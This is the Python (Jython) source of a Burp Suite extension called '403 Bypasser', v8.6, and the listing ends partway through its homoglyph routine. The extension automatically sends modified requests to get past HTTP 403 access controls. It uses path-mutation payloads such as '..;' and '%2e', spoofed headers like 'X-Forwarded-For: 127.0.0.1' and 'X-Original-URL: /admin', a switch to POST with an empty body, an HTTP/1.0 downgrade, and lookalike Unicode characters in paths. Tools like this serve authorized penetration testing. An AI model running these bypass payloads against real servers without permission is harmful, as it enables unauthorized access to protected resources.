# Full Code for 403 Bypasser Burp Suite Extension
# v8.6 - Remove xpto/; payload, add Homoglyph check

from burp import IBurpExtender, IScanIssue, IScannerCheck, IContextMenuFactory, IContextMenuInvocation, ITab
from javax.swing import JMenuItem, JPanel, JLabel, JScrollPane, JTextArea, GroupLayout, LayoutStyle, JFrame
from java.awt import BorderLayout
import java.util.ArrayList as ArrayList
import java.lang.String as String
from java.lang import Short
import java.util.Arrays # For copyOfRange
import java.lang.reflect.Array # For creating empty byte[]
import java.lang.Byte # For empty byte[] type

import sys
import thread
# import traceback # Keep commented unless needed for deep debugging

# --- Default Payloads ---
# v8.6: Removed 'xpto/;'
defaultQueryPayloads = [
    "%09", "%20", "%23", "%2e", "%2f", ".", ";", "..;", "%2e%2e;", ";%09",
    ";%09..", ";%09..;", ";%2f..", "*", "xpto/%2e%2e", "xpto/..", "xpto/..;"
    # 'xpto/;' removed
]
defaultHeaderPayloads = [
    # ... (no changes) ...
    "Base-Url: 127.0.0.1", "CF-Connecting_IP: 127.0.0.1", "CF-Connecting-IP: 127.0.0.1",
    "Client-IP: 127.0.0.1", "Destination: 127.0.0.1", "From: 127.0.0.1", "Host: 127.0.0.1",
    "Http-Url: 127.0.0.1", "Origin: 127.0.0.1", "Proxy: 127.0.0.1", "Proxy-Host: 127.0.0.1",
    "Proxy-Url: 127.0.0.1", "Real-Ip: 127.0.0.1", "Redirect: 127.0.0.1", "Referer: 127.0.0.1",
    "Referrer: 127.0.0.1", "Refferer: 127.0.0.1", "Request-Uri: 127.0.0.1",
    "True-Client-IP: 127.0.0.1", "Uri: 127.0.0.1", "Url: 127.0.0.1", "X-Client-IP: 127.0.0.1",
    "X-Custom-IP-Authorization: 127.0.0.1", "X-Forwarded: 127.0.0.1", "X-Forwarded-By: 127.0.0.1",
    "X-Forwarded-For: 127.0.0.1", "X-Forwarded-For-Original: 127.0.0.1",
    "X-Forwarded-Host: 127.0.0.1", "X-Forwarded-Server: 127.0.0.1", "X-Forwarder-For: 127.0.0.1",
    "X-Forward-For: 127.0.0.1", "X-Host: 127.0.0.1", "X-Http-Destinationurl: 127.0.0.1",
    "X-HTTP-DestinationURL: 127.0.0.1", "X-Http-Host-Override: 127.0.0.1",
    "X-Originally-Forwarded-For: 127.0.0.1", "X-Original-Remote-Addr: 127.0.0.1",
    "X-Original-Url: /admin", # Example using a path
    "X-Original-URL: /admin",
    "X-Originating-IP: 127.0.0.1", "X-Override-Url: /admin",
    "X-Proxy-Url: 127.0.0.1", "X-ProxyUser-Ip: 127.0.0.1", "X-Real-Ip: 127.0.0.1",
    "X-Referrer: 127.0.0.1", "X-Remote-Addr: 127.0.0.1", "X-Remote-IP: 127.0.0.1",
    "X-Rewrite-Url: /admin",
    "X-Rewrite-URL: /admin",
    "X-True-IP: 127.0.0.1", "X-WAP-Profile: 127.0.0.1"
]
defaultFalsePositives = [
    # ... (no changes) ...
]

extentionName = "403 Bypasser"

# --- Homoglyph Map --- (Defined outside class or inside as class variable)
homoglyphMap = {
    "a": [ u"\u0430", u"\u00e0", u"\u00e1", u"\u1ea1", u"\u0105" ],
    "c": [ u"\u0441", u"\u0188", u"\u010b" ],
    "d": [ u"\u0501", u"\u0257" ],
    "e": [ u"\u0435", u"\u1eb9", u"\u0117", u"\u0117", u"\u00e9", u"\u00e8" ],
    "g": [ u"\u0121" ],
    "h": [ u"\u04bb" ],
    "i": [ u"\u0456", u"\u00ed", u"\u00ec", u"\u00ef" ],
    "j": [ u"\u0458", u"\u029d" ],
    "k": [ u"\u03ba" ],
    "l": [ u"\u04cf", u"\u1e37" ],
    "n": [ u"\u0578" ],
    "o": [ u"\u043e", u"\u03bf", u"\u0585", u"\u022f", u"\u1ecd", u"\u1ecf", u"\u01a1", u"\u00f6", u"\u00f3", u"\u00f2" ],
    "p": [ u"\u0440" ],
    "q": [ u"\u0566" ],
    "s": [ u"\u0282" ],
    "u": [ u"\u03c5", u"\u057d", u"\u00fc", u"\u00fa", u"\u00f9" ],
    "v": [ u"\u03bd", u"\u0475" ],
    "x": [ u"\u0445", u"\u04b3" ],
    "y": [ u"\u0443", u"\u00fd" ],
    "z": [ u"\u0290", u"\u017c" ]
}

# --- Burp Extender Class ---
class BurpExtender(IBurpExtender, IScannerCheck, IContextMenuFactory, ITab):
    # ... (registerExtenderCallbacks, getTabCaption, getUiComponent, createMenuItems, testFromMenu, isInteresting, findAllCharIndexesInString remain the same) ...

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = self.callbacks.getHelpers()
        self.callbacks.registerScannerCheck(self)
        self.callbacks.registerContextMenuFactory(self)
        self.callbacks.setExtensionName(extentionName)
        self.frm = uiTab()
        self.callbacks.addSuiteTab(self)
        sys.stdout = self.callbacks.getStdout()
        sys.stderr = self.callbacks.getStderr()
        print("403 Bypasser extension loaded.")
        print("Default payloads and false positive keywords loaded into the UI tab.")
        return None

    def getTabCaption(self):
        return extentionName

    def getUiComponent(self):
        return self.frm.panel

    def createMenuItems(self, invocation):
        self.context = invocation
        menuList = []
        menuItem = JMenuItem("Send to 403 Bypasser (Active Scan)", actionPerformed=self.testFromMenu)
        menuList.append(menuItem)
        return menuList

    def testFromMenu(self, event):
        selectedMessages = self.context.getSelectedMessages()
        if not selectedMessages:
            print("No messages selected.")
            return None
        print("Sending {} selected message(s) to 403 Bypasser scan...".format(len(selectedMessages)))
        for message in selectedMessages:
            thread.start_new_thread(self.doActiveScan, (message, None, True ))
        return None

    def isInteresting(self, response):
        if response is None: return False
        responseInfo = self.helpers.analyzeResponse(response)
        return responseInfo.getStatusCode() == 403

    def findAllCharIndexesInString(self, s, ch):
        return [i for i, ltr in enumerate(s) if ltr == ch]

    # --- MODIFIED generatePayloads function ---
    def generatePayloads(self, path, payload):
        """
        Generates various path permutations with the given payload.
        MODIFIED: Prevents replacing the *only* top-level path segment entirely.
        e.g., /admin/ will not generate /PAYLOAD/, but /admin/users/ can generate /admin/PAYLOAD/
        """
        payloads = []
        clean_payload = payload.strip('/') # Payload without leading/trailing slashes
        if not clean_payload:
            print("    [generatePayloads] Skipping empty payload after stripping.")
            return []

        # Handle root path specifically
        if not path or path == "/":
            print("    [generatePayloads] Original path is root '/'")
            payloads.append("/" + clean_payload)
            payloads.append("/" + clean_payload + "/")
            # If original payload had slashes, add that too (e.g., payload = '/%2e/')
            if payload != clean_payload:
                 payloads.append("/" + payload.strip('/')) # Ensure no double slashes at start
            # Remove duplicates and return
            final_payloads = list(set(payloads))
            print("    [generatePayloads] Generated for root: " + str(final_payloads))
            return final_payloads

        print("    [generatePayloads] Original path: '" + path + "', Payload: '" + payload + "', Clean Payload: '" + clean_payload + "'")
        indices = self.findAllCharIndexesInString(path, "/")
        print("    [generatePayloads] Slash indices: " + str(indices))

        # --- Insertions before existing slashes ---
        for i in indices:
             if i > 0: # Don't prepend payload if slash is at index 0 unless path is just "/" (handled above)
                # Example: /admin/foo -> /admin/PAYLOAD/foo
                pathWithPayload = path[:i] + "/" + clean_payload + path[i:]
                payloads.append(pathWithPayload)

        # --- Insertions after existing slashes ---
        for i in indices:
            # Example: /admin/foo -> /admin/PAYLOADfoo or /admin/foo/ -> /admin/foo/PAYLOAD
            if i < len(path) - 1: # If slash is not the last character
                 pathWithPayload = path[:i+1] + clean_payload + path[i+1:]
                 payloads.append(pathWithPayload)
            else: # If slash is the last character (e.g., /admin/)
                 # Example: /admin/ -> /admin/PAYLOAD
                 pathWithPayload = path + clean_payload
                 payloads.append(pathWithPayload)

        # --- Replacements between existing slashes ---
        # This is the loop where the problematic replacement (/admin/ -> /PAYLOAD/) occurs
        for k in range(len(indices) - 1):
             i = indices[k]   # Start slash index
             j = indices[k+1] # End slash index

             # *** ADDED CHECK ***
             # Prevent replacing the *first and only* directory segment entirely.
             # This happens when:
             # - We are looking between the first (k=0) and second slash.
             # - The first slash is at index 0 (i=0).
             # - There are only two slashes total (len(indices) == 2), meaning only one segment.
             # Example: path='/admin/', indices=[0, 6]. k=0, i=0, j=6. len(indices)==2. Skip!
             # Example: path='/admin/users/', indices=[0, 6, 12].
             #   k=0, i=0, j=6. len(indices)!=2. OK -> /PAYLOAD/users/
             #   k=1, i=6, j=12. k!=0. OK -> /admin/PAYLOAD/
             if k == 0 and i == 0 and len(indices) == 2:
                 print("    [generatePayloads] Skipping replacement of the only path segment.")
                 continue
             # *** END ADDED CHECK ***

             # Original replacement logic (now conditional)
             if j > i + 1: # Ensure there's content between slashes
                  # Example: /admin/foo/bar -> /admin/PAYLOAD/bar (when k points to admin/foo)
                  pathWithPayload = path[:i+1] + clean_payload + path[j:]
                  payloads.append(pathWithPayload)

        # --- Appending payload ---
        if path.endswith('/'):
             # Example: /admin/ -> /admin/PAYLOAD and /admin/PAYLOAD/
             payloads.append(path + clean_payload)
             payloads.append(path + clean_payload + "/")
        else:
             # Example: /admin -> /admin/PAYLOAD and /admin/PAYLOAD/
             payloads.append(path + "/" + clean_payload)
             payloads.append(path + "/" + clean_payload + "/")

        # --- Appending raw payload (might include slashes) ---
        # Example: /admin and payload ;foo -> /admin;foo
        payloads.append(path + payload)

        # --- Prefixing payload to the last path segment ---
        # Example: /api/users and payload %2e -> /api/%2eusers
        if '/' in path.strip('/'): # Ensure there is a slash other than potentially the first char
            last_slash = path.rfind('/')
            if last_slash > 0: # If slash is not at the beginning
                # Example: /api/users -> /api/PAYLOADusers
                payloads.append(path[:last_slash+1] + clean_payload + path[last_slash+1:])
            elif last_slash == 0 and len(path) > 1: # If slash is only at the beginning e.g. /admin
                 # Example: /admin -> /PAYLOADadmin
                 payloads.append("/" + clean_payload + path[1:])

        # Remove duplicates and return
        final_payloads = list(set(payloads))
        print("    [generatePayloads] Generated: " + str(final_payloads))
        return final_payloads

    # --- False Positive Check ---
    def isFalsePositive(self, responseBytes, falsePositiveKeywords):
        # ... (isFalsePositive code remains the same) ...
        print("      [FP Check] Starting false positive check...")
        if not falsePositiveKeywords:
            print("      [FP Check] No false positive keywords configured.")
            return False
        if responseBytes is None:
            print("      [FP Check] Response bytes are None.")
            return False
        try:
            responseStr = self.helpers.bytesToString(responseBytes).lower()
            print("      [FP Check] Checking against keywords: " + repr(falsePositiveKeywords))
            for keyword in falsePositiveKeywords:
                if keyword and isinstance(keyword, basestring):
                    clean_keyword = keyword.strip()
                    print("      [FP Check]   Cleaned keyword: '" + clean_keyword + "'")
                    if clean_keyword:
                        keyword_lower = clean_keyword.lower()
                        match_found = keyword_lower in responseStr
                        print("      [FP Check]     Keyword (lower): '" + keyword_lower + "'")
                        print("      [FP Check]     Found in response? " + str(match_found))
                        if match_found:
                            print("      >>>>> [FP Check] Match FOUND! Returning True (Is False Positive).")
                            return True
                    else:
                        print("      [FP Check]   Skipping empty keyword after stripping.")
                else:
                    print("      [FP Check]   Skipping invalid keyword entry (not str or unicode): " + repr(keyword))
        except NameError:
             print("      (!) [FP Check] NameError: 'basestring' not defined. Cannot perform type check accurately.")
             try:
                clean_keyword = str(keyword).strip()
                if clean_keyword:
                     keyword_lower = clean_keyword.lower()
                     if keyword_lower in responseStr:
                          print("      >>>>> [FP Check] Match FOUND (via fallback str conversion)! Returning True.")
                          return True
             except Exception as fallback_err:
                  print("      (!) [FP Check] Error during fallback string conversion: " + str(fallback_err))
             return False
        except Exception as e:
            print("      (!) [FP Check] Error during false positive check: " + str(e))
            return False
        print("      [FP Check] No matching keywords found. Returning False (Not False Positive).")
        return False


    # --- Bypass Functions ---
    def tryBypassWithQueryPayload(self, request, payload, httpService, falsePositiveKeywords):
        # ... (This function now uses the MODIFIED generatePayloads) ...
        print("  [Query] Testing payload: '" + payload + "'")
        try:
            originalRequestInfo = self.helpers.analyzeRequest(request)
            if originalRequestInfo is None:
                print("    (!) Failed to analyze original request. Skipping payload.")
                return None
            originalHeadersJavaList = originalRequestInfo.getHeaders()
            raw_original_request_bytes = request.getRequest()
            original_body_offset = originalRequestInfo.getBodyOffset()
            original_body_length = len(raw_original_request_bytes) - original_body_offset
            originalBodyJavaBytes = None
            if original_body_length > 0:
                originalBodyJavaBytes = java.util.Arrays.copyOfRange(raw_original_request_bytes,
                                                                      original_body_offset,
                                                                      len(raw_original_request_bytes))
            else:
                originalBodyJavaBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)
            originalUrl = originalRequestInfo.getUrl()
            originalPath = originalUrl.getPath()
            if originalPath is None: originalPath = "/"
            elif not originalPath: originalPath = "/"
        except Exception as analysis_err:
            print("    (!) Error analyzing original request: {}. Skipping payload.".format(analysis_err))
            return None
        # print("    Original path: '" + originalPath + "'") # Moved this print inside generatePayloads
        if not originalHeadersJavaList or originalHeadersJavaList.isEmpty():
            print("    (!) Original request has no headers. Skipping payload.")
            return None
        original_request_line = originalHeadersJavaList.get(0)
        parts = original_request_line.split(" ", 2)
        if len(parts) < 3:
            print("    (!) Malformed original request line? Skipping: '" + original_request_line + "'")
            return None
        original_method = parts[0]
        original_protocol = parts[2]

        # ---> This call now uses the modified logic <---
        payloadsToTest = self.generatePayloads(originalPath, payload)

        if not payloadsToTest:
            print("    No paths generated for this payload and path combination.")
            return None
        # print("    Generated paths to test: " + str(payloadsToTest)) # Moved this print inside generatePayloads

        for pathToTest in payloadsToTest:
            print("    Trying path: '" + pathToTest + "'")
            try:
                # Ensure path starts with / if it doesn't already (should be handled by generatePayloads)
                if not pathToTest.startswith("/"):
                    pathToTest = "/" + pathToTest

                new_request_line_str = original_method + " " + pathToTest + " " + original_protocol
                newHeadersList = ArrayList()
                newHeadersList.add(String(new_request_line_str))
                if originalHeadersJavaList.size() > 1:
                    for i in range(1, originalHeadersJavaList.size()):
                        newHeadersList.add(originalHeadersJavaList.get(i))
                newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyJavaBytes)
                newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
                responseBytes = newRequestResult.getResponse()
                if responseBytes is None:
                   print("      -> Status: No response received.")
                   continue
                responseInfo = self.helpers.analyzeResponse(responseBytes)
                newRequestStatusCode = responseInfo.getStatusCode()
                print("      -> Status: " + str(newRequestStatusCode))
                if 200 <= newRequestStatusCode < 300:
                    is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                    if not is_fp:
                        # Construct the full URL for reporting
                        portStr = ":" + str(originalUrl.getPort()) if originalUrl.getPort() != originalUrl.getDefaultPort() else ""
                        vulnerableReuqestUrlStr = str(originalUrl.getProtocol() + "://" + originalUrl.getHost() + portStr + pathToTest)

                        resultContentLength = "N/A"
                        respHeaders = responseInfo.getHeaders()
                        for header in respHeaders:
                            if header.lower().startswith("content-length:"):
                                resultContentLength = header.split(":", 1)[1].strip()
                                break
                        print("      ****** SUCCESS (Query Bypass) ******")
                        print("      URL: " + vulnerableReuqestUrlStr)
                        print("      Payload Used (in generation): " + payload) # Original payload used for generation
                        print("      Path Tested: " + pathToTest) # Actual path that worked

                        # Highlight the original payload within the path if possible, otherwise just show path
                        displayPath = vulnerableReuqestUrlStr
                        try:
                            # Simple highlighting attempt (might not be perfect for complex encodings/paths)
                            if payload in pathToTest:
                                displayPath = vulnerableReuqestUrlStr.replace(payload, "<b>" + payload + "</b>", 1)
                            elif clean_payload in pathToTest:
                                displayPath = vulnerableReuqestUrlStr.replace(clean_payload, "<b>" + clean_payload + "</b>", 1)
                        except Exception:
                            pass # Ignore highlighting errors

                        detail = "<tr><td>Query Payload</td><td>" + displayPath + "</td><td>" + payload + "</td><td>" + str(newRequestStatusCode) + "</td><td>" + resultContentLength + "</td></tr>"
                        return [detail, newRequestResult]
            except Exception as e:
                print("      (!) Error during request processing for path '" + pathToTest + "': " + str(e))
        print("  [Query] Finished payload '" + payload + "' - no bypass found.")
        return None

    def tryBypassWithHeaderPayload(self, baseRequestResponse, payload, httpService, falsePositiveKeywords):
        # ... (tryBypassWithHeaderPayload code remains the same) ...
        print("  [Header] Testing payload: '" + payload + "'")
        try:
            requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if requestInfo is None:
                 print("    (!) Failed to analyze original request. Skipping payload.")
                 return None
            raw_original_request_bytes = baseRequestResponse.getRequest()
            original_body_offset = requestInfo.getBodyOffset()
            original_body_length = len(raw_original_request_bytes) - original_body_offset
            originalBodyJavaBytes = None
            if original_body_length > 0:
                originalBodyJavaBytes = java.util.Arrays.copyOfRange(raw_original_request_bytes,
                                                                      original_body_offset,
                                                                      len(raw_original_request_bytes))
            else:
                originalBodyJavaBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)
            originalHeaders = list(requestInfo.getHeaders())
            header_parts = payload.split(":", 1)
            if len(header_parts) != 2:
                print("    (!) Skipping invalid header payload format: " + payload)
                return None
            header_name = header_parts[0].strip()
            header_value = header_parts[1].strip()
            if not header_name:
                print("    (!) Skipping header payload with empty name.")
                return None
            payload_normalized = header_name + ": " + header_value
            newHeadersList = ArrayList()
            header_replaced_or_added = False
            for header in originalHeaders:
                current_header_name = header.split(":", 1)[0].strip()
                if current_header_name.lower() == header_name.lower():
                    newHeadersList.add(String(payload_normalized))
                    header_replaced_or_added = True
                    print("    Replaced existing header: " + header_name)
                else:
                    newHeadersList.add(header)
            if not header_replaced_or_added:
                newHeadersList.add(String(payload_normalized))
                print("    Added new header: " + header_name)
            newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyJavaBytes)
            newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
            responseBytes = newRequestResult.getResponse()
            if responseBytes is None:
                print("      -> Status: No response received.")
                return None
            responseInfo = self.helpers.analyzeResponse(responseBytes)
            newRequestStatusCode = responseInfo.getStatusCode()
            print("      -> Status: " + str(newRequestStatusCode))
            if 200 <= newRequestStatusCode < 300:
                is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                if not is_fp:
                    originalRequestUrl = str(requestInfo.getUrl())
                    resultContentLength = "N/A"
                    respHeaders = responseInfo.getHeaders()
                    for header in respHeaders:
                        if header.lower().startswith("content-length:"):
                            resultContentLength = header.split(":", 1)[1].strip()
                            break
                    print("      ****** SUCCESS (Header Bypass) ******")
                    print("      URL: " + originalRequestUrl)
                    print("      Header Used: " + payload_normalized)
                    detail = "<tr><td>Header</td><td>" + originalRequestUrl + "</td><td><b>" + payload_normalized + "</b></td><td>" + str(newRequestStatusCode) + "</td><td>" + resultContentLength + "</td></tr>"
                    return [detail, newRequestResult]
        except Exception as e:
            print("    (!) Error testing header payload '" + payload + "': " + str(e))
        return None

    def tryBypassWithPOSTAndEmptyCL(self, baseRequestResponse, httpService, falsePositiveKeywords):
        # ... (tryBypassWithPOSTAndEmptyCL code remains the same) ...
        print("  [Method] Testing POST + Content-Length: 0")
        try:
            requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if requestInfo is None:
                print("    (!) Failed to analyze original request. Skipping test.")
                return None
            originalHeaders = list(requestInfo.getHeaders())
            if not originalHeaders or not originalHeaders[0].startswith("GET "):
                print("    Skipping - original method is not GET.")
                return None
            headers = ArrayList()
            headers.add(String(originalHeaders[0].replace("GET ", "POST ", 1)))
            for i in range(1, len(originalHeaders)):
                headers.add(originalHeaders[i])
            headers.add(String("Content-Length: 0"))
            print("    Added Content-Length: 0 and changed method to POST.")
            emptyBodyJavaBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)
            newRequestBytes = self.helpers.buildHttpMessage(headers, emptyBodyJavaBytes)
            newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
            responseBytes = newRequestResult.getResponse()
            if responseBytes is None:
                print("      -> Status: No response received.")
                return None
            responseInfo = self.helpers.analyzeResponse(responseBytes)
            newRequestStatusCode = responseInfo.getStatusCode()
            print("      -> Status: " + str(newRequestStatusCode))
            if 200 <= newRequestStatusCode < 300:
                 is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                 if not is_fp:
                    requestUrl = str(requestInfo.getUrl())
                    resultContentLength = "N/A"
                    respHeaders = responseInfo.getHeaders()
                    for header in respHeaders:
                        if header.lower().startswith("content-length:"):
                            resultContentLength = header.split(":", 1)[1].strip()
                            break
                    print("      ****** SUCCESS (Method Change Bypass) ******")
                    print("      URL: " + requestUrl)
                    detail = "<tr><td>Method Change</td><td>" + requestUrl + "</td><td>POST + Content-Length: 0</td><td>" + str(newRequestStatusCode) + "</td><td>" + resultContentLength + "</td></tr>"
                    return [detail, newRequestResult]
        except Exception as e:
            print("    (!) Error testing POST + CL:0 method: " + str(e))
        return None

    def tryBypassWithDowngradedHttpAndNoHeaders(self, baseRequestResponse, httpService, falsePositiveKeywords):
        # ... (tryBypassWithDowngradedHttpAndNoHeaders code remains the same) ...
        print("  [Protocol] Testing HTTP/1.0 downgrade (minimal headers)")
        try:
            requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if requestInfo is None:
                print("    (!) Failed to analyze original request. Skipping test.")
                return None
            originalJavaHeaders = requestInfo.getHeaders()
            raw_original_request_bytes = baseRequestResponse.getRequest()
            original_body_offset = requestInfo.getBodyOffset()
            original_body_length = len(raw_original_request_bytes) - original_body_offset
            originalBodyJavaBytes = None
            if original_body_length > 0:
                originalBodyJavaBytes = java.util.Arrays.copyOfRange(raw_original_request_bytes,
                                                                      original_body_offset,
                                                                      len(raw_original_request_bytes))
            else:
                originalBodyJavaBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)
            if not originalJavaHeaders or originalJavaHeaders.isEmpty():
                print("    (!) Skipping - No original headers found.")
                return None
            original_first_line = originalJavaHeaders.get(0)
            newHeaderLine = None
            if " HTTP/1.1" in original_first_line:
                newHeaderLine = original_first_line.replace(" HTTP/1.1", " HTTP/1.0", 1)
            elif " HTTP/2" in original_first_line:
                 newHeaderLine = original_first_line.replace(" HTTP/2", " HTTP/1.0", 1)
            elif " HTTP/1.0" in original_first_line:
                 print("    Skipping - Protocol is already HTTP/1.0.")
                 return None
            else:
                 print("    (!) Skipping - Cannot determine HTTP version in request line.")
                 return None
            headers = ArrayList()
            headers.add(String(newHeaderLine))
            host_header = None
            for i in range(1, originalJavaHeaders.size()):
                 hdr = originalJavaHeaders.get(i)
                 if hdr.lower().startswith("host:"):
                      host_header = hdr
                      break
            if host_header:
                 headers.add(host_header)
            else:
                 print("    (!) Warning: Could not find Host header in original request for HTTP/1.0 downgrade.")
            print("    Downgraded protocol to HTTP/1.0 and kept minimal headers (Request-Line, Host).")
            newRequestBytes = self.helpers.buildHttpMessage(headers, originalBodyJavaBytes)
            newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
            responseBytes = newRequestResult.getResponse()
            if responseBytes is None:
                print("      -> Status: No response received.")
                return None
            responseInfo = self.helpers.analyzeResponse(responseBytes)
            newRequestStatusCode = responseInfo.getStatusCode()
            print("      -> Status: " + str(newRequestStatusCode))
            if 200 <= newRequestStatusCode < 300:
                is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                if not is_fp:
                    requestUrl = str(requestInfo.getUrl())
                    resultContentLength = "N/A"
                    respHeaders = responseInfo.getHeaders()
                    for header in respHeaders:
                        if header.lower().startswith("content-length:"):
                            resultContentLength = header.split(":", 1)[1].strip()
                            break
                    print("      ****** SUCCESS (HTTP Downgrade Bypass) ******")
                    print("      URL: " + requestUrl)
                    detail = "<tr><td>HTTP Downgrade</td><td>" + requestUrl + "</td><td>HTTP/1.0 (minimal headers)</td><td>" + str(newRequestStatusCode) + "</td><td>" + resultContentLength + "</td></tr>"
                    return [detail, newRequestResult]
        except Exception as e:
            print("    (!) Error testing HTTP/1.0 downgrade method: " + str(e))
        return None

    # --- Homoglyph Bypass ---
    def tryBypassWithHomoglyph(self, baseRequestResponse, httpService, falsePositiveKeywords):
        # ... (tryBypassWithHomoglyph code remains the same) ...
        print("  [Homoglyph] Testing path character replacements...")
        try:
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if originalRequestInfo is None:
                print("    (!) Failed to analyze original request. Skipping homoglyph tests.")
                return None
            originalHeadersJavaList = originalRequestInfo.getHeaders()
            raw_original_request_bytes = baseRequestResponse.getRequest()
            original_body_offset = originalRequestInfo.getBodyOffset()
            original_body_length = len(raw_original_request_bytes) - original_body_offset
            originalBodyJavaBytes = None
            if original_body_length > 0:
                originalBodyJavaBytes = java.util.Arrays.copyOfRange(raw_original_request_bytes,
                                                                      original_body_offset,
                                                                      len(raw_original_request_bytes))
            else:
                originalBodyJavaBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)
            originalUrl = originalRequestInfo.getUrl()
            originalPath = originalUrl.getPath() # This should be url-decoded by getPath()
            if originalPath is None or not originalPath:
                originalPath = "/"
            print("    Original path for homoglyph checks: '" + originalPath.encode('utf-8') + "'") # Encode for printing
            if not originalHeadersJavaList or originalHeadersJavaList.isEmpty():
                print("    (!) Original request has no headers. Skipping.")
                return None
            original_request_line = originalHeadersJavaList.get(0)
            parts = original_request_line.split(" ", 2)
            if len(parts) < 3:
                print("    (!) Malformed original request line? Skipping.")
                return None
            original_method = parts[0]
            original_protocol = parts[2]
            first_alpha_index = -1
            first_alpha_char = None
            last_alpha_index = -1
            last_alpha_char = None
            for i, char in enumerate(originalPath):
                if char.isalpha():
                    if first_alpha_index == -1:
                        first_alpha_index = i
                        first_alpha_char = char
                    last_alpha_index = i # Keep updating for the last one
                    last_alpha_char = char
            if first_alpha_index == -1:
                print("    No alphabetical characters found in path. Skipping homoglyph checks.")
                return None
            print("    Testing first alpha char: '" + first_alpha_char + "' at index " + str(first_alpha_index))
            char_lower = first_alpha_char.lower()
            if char_lower in homoglyphMap:
                for homoglyph in homoglyphMap[char_lower]:
                    try:
                        newPath = originalPath[:first_alpha_index] + homoglyph + originalPath[first_alpha_index + 1:]
                        new_request_line_unicode = unicode(original_method) + u" " + newPath + u" " + unicode(original_protocol)
                        print("    Trying path (unicode): " + repr(newPath)) # Print representation
                        print("    Request Line (unicode): " + repr(new_request_line_unicode)) # Print representation
                        newHeadersList = ArrayList()
                        newHeadersList.add(String(new_request_line_unicode))
                        if originalHeadersJavaList.size() > 1:
                            for i in range(1, originalHeadersJavaList.size()):
                                newHeadersList.add(originalHeadersJavaList.get(i))
                        newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyJavaBytes)
                        newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
                        responseBytes = newRequestResult.getResponse()
                        if responseBytes is None:
                           print("      -> Status: No response received.")
                           continue
                        responseInfo = self.helpers.analyzeResponse(responseBytes)
                        newRequestStatusCode = responseInfo.getStatusCode()
                        print("      -> Status: " + str(newRequestStatusCode))
                        if 200 <= newRequestStatusCode < 300:
                            is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                            if not is_fp:
                                vulnerablePathStr = newPath # Keep unicode for display
                                resultContentLength = "N/A"
                                respHeaders = responseInfo.getHeaders()
                                for header in respHeaders:
                                    if header.lower().startswith("content-length:"):
                                        resultContentLength = header.split(":", 1)[1].strip()
                                        break
                                print("      ****** SUCCESS (Homoglyph Bypass - First Char) ******")
                                print("      Path: " + repr(vulnerablePathStr))
                                print("      Original Char: " + repr(first_alpha_char))
                                print("      Homoglyph Used: " + repr(homoglyph))
                                print("      Index: " + str(first_alpha_index))
                                detail = (u"<tr><td>Homoglyph (First)</td><td>" + repr(vulnerablePathStr) + u"</td><td>" +
                                          repr(first_alpha_char) + u"</td><td>" + repr(homoglyph) + u"</td><td>" +
                                          unicode(str(first_alpha_index)) + u"</td><td>" + unicode(str(newRequestStatusCode)) + u"</td><td>" +
                                          unicode(resultContentLength) + u"</td></tr>")
                                return [detail, newRequestResult]
                    except Exception as e:
                        print("      (!) Error processing homoglyph " + repr(homoglyph) + " for first char: " + str(e))
            else:
                 print("    No homoglyphs found for character '" + first_alpha_char + "'")
            if last_alpha_index != first_alpha_index:
                print("    Testing last alpha char: '" + last_alpha_char + "' at index " + str(last_alpha_index))
                char_lower = last_alpha_char.lower()
                if char_lower in homoglyphMap:
                    for homoglyph in homoglyphMap[char_lower]:
                        try:
                            newPath = originalPath[:last_alpha_index] + homoglyph + originalPath[last_alpha_index + 1:]
                            new_request_line_unicode = unicode(original_method) + u" " + newPath + u" " + unicode(original_protocol)
                            print("    Trying path (unicode): " + repr(newPath))
                            print("    Request Line (unicode): " + repr(new_request_line_unicode))
                            newHeadersList = ArrayList()
                            newHeadersList.add(String(new_request_line_unicode)) # Pass unicode
                            if originalHeadersJavaList.size() > 1:
                                for i in range(1, originalHeadersJavaList.size()):
                                    newHeadersList.add(originalHeadersJavaList.get(i))
                            newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyJavaBytes)
                            newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
                            responseBytes = newRequestResult.getResponse()
                            if responseBytes is None:
                               print("      -> Status: No response received.")
                               continue
                            responseInfo = self.helpers.analyzeResponse(responseBytes)
                            newRequestStatusCode = responseInfo.getStatusCode()
                            print("      -> Status: " + str(newRequestStatusCode))
                            if 200 <= newRequestStatusCode < 300:
                                is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                                if not is_fp:
                                    vulnerablePathStr = newPath
                                    resultContentLength = "N/A"
                                    respHeaders = responseInfo.getHeaders()
                                    for header in respHeaders:
                                        if header.lower().startswith("content-length:"):
                                            resultContentLength = header.split(":", 1)[1].strip()
                                            break
                                    print("      ****** SUCCESS (Homoglyph Bypass - Last Char) ******")
                                    print("      Path: " + repr(vulnerablePathStr))
                                    print("      Original Char: " + repr(last_alpha_char))
                                    print("      Homoglyph Used: " + repr(homoglyph))
                                    print("      Index: " + str(last_alpha_index))
                                    detail = (u"<tr><td>Homoglyph (Last)</td><td>" + repr(vulnerablePathStr) + u"</td><td>" +
